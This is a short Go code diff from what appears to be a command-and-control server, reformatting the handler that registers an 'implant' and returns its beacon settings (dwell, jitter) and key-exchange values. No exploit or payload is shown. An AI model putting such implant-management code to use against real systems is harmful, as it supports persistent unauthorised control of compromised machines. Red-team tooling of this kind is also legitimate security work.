@@ -3,7 +3,7 @@ package main
 import (
 	"net/http"
 	"strconv"
-	"keyex"
+
 	"github.com/gin-gonic/gin"
 	"gorm.io/gorm"
 )
@@ -48,14 +48,13 @@ func (l *HTTPSListener) Register(c *gin.Context) {
 
 	// Create Implant
 	implant := &Implant{
-		SystemInfo:   sysInfo,
-		Dwell:        "30s",
-		Jitter:       0,
-		CommProtocol: DEFAULT_IMPLANT_COMM_PROTOCOL,
-		p: p, 
-		g: g, 
-		SeverPubKey: server_public_key
-	}
+		SystemInfo:        sysInfo,
+		Dwell:             "30s",
+		Jitter:            0,
+		CommProtocol:      DEFAULT_IMPLANT_COMM_PROTOCOL,
+		p:                 p,
+		g:                 g,
+		server_public_key: server_public_key}
 	if err := l.db.Create(implant).Error; err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
@@ -65,12 +64,11 @@ func (l *HTTPSListener) Register(c *gin.Context) {
 		"id":            implant.ID,
 		"comm_protocol": implant.CommProtocol.String(),
 		"config": gin.H{
-			"dwell":  implant.Dwell,
-			"jitter": implant.Jitter,
-			"p": p,
-			"g": g,
-			"server public key": server_public_key
-		},
+			"dwell":             implant.Dwell,
+			"jitter":            implant.Jitter,
+			"p":                 implant.p,
+			"g":                 implant.g,
+			"server_public_key": implant.server_public_key},
 	})
 }
 
